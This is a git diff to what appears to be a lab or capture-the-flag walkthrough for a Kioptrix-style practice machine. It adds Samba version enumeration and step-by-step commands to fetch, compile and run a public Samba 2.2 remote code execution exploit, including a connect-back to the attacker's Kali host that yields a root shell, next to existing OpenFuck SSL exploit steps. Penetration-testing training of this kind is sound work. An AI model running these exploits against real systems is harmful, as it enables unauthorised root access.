@@ -136,11 +136,33 @@ nikto -h http://192.168.1.104
 + End Time:           2023-04-13 15:45:20 (GMT-4) (22 seconds)
 ```
 
+### Port 445 - Samba (2.2.1a)
+
+smb\_version:
+
+* We can also analyze SMB/SAMBA packets in Wireshark to verify the Samba version inside of the TCP steam
+
+```
+msfconsole
+search smb_version
+set RHOSTS 192.168.1.104
+run
+```
+
+Samba 2.2 RCE (10.c):
+
+```
+searchsploit samba 2.2
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution 10.c
+searchsploit -m 10.c
+gcc 10.c -o 10
+```
+
 ## Exploitation
 
 There are multiple ways to exploit and gain access to this machine. <mark style="color:yellow;">This is the first one</mark>.
 
-OpenFuck SSL RCEL:
+### OpenFuck SSL RCEL:
 
 This is a C file, you must compile the binary with `gcc` and then use the proper arguments to satisfy the exploit. You will get some warnings, that's okay, just ignore them.
 
@@ -152,7 +174,18 @@ gcc -o OpenFuck OpenFuck.c -lcrypto
 ./OpenFuck 0x6b 192.168.1.104 443 -c 40
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 * You can see that we land as a root user
 
+### Samba 2.2.x RCE
+
+10.c -- be sure to compile (shown above in enumeration):
+
+```
+./10 -b=0 -c <kali_ip> <target_ip>
+```
+
+* You can see that we land as root again!
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
